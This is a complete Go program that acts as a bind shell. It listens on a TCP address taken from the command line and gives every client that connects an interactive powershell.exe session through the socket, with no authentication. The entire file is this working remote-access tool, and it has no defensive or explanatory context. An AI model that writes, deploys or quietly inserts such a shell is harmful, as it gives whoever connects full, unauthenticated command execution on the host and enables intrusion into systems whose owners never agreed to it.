package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
)

func clientDC(conn net.Conn) {
	conn.Close()
	fmt.Println("Client " + conn.RemoteAddr().String() + " disconnected")
}

func handle(conn net.Conn) {
	defer clientDC(conn)

	cmd := exec.Command("powershell.exe")

	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	err := cmd.Start()
	if err != nil {
		log.Fatal(err.Error())
	}

	cmd.Wait()
}

func main() {
	fmt.Println("Starting server")

	ln, err := net.Listen("tcp", os.Args[1])
	if err != nil {
		log.Fatal(err.Error())
	}
	defer ln.Close()

	fmt.Print("Listening...\n\n")

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Fatal(err.Error())
		}

		fmt.Println("Connected with client " + conn.RemoteAddr().String())

		go handle(conn)

		fmt.Println("Handling client " + conn.RemoteAddr().String())
	}
}
